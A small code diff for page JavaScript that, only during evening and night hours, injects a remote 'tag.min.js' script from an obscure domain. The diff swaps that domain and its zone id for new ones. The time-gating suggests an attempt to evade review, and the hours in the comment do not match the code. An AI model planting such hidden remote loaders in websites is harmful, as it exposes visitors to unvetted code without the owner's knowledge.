@@ -4,8 +4,8 @@
     // Check if current time is between 6 PM (18) and 4 AM (4)
     if (currentHour >= 18 || currentHour < 9) {
         var s = document.createElement('script');
-        s.src = 'https://kulroakonsu.net/88/tag.min.js';
-        s.setAttribute('data-zone', '140848');
+        s.src = 'https://shebudriftaiter.net/tag.min.js';
+        s.setAttribute('data-zone', '9173610');
 
         function appendScript() {
             var target = document.body || document.documentElement;
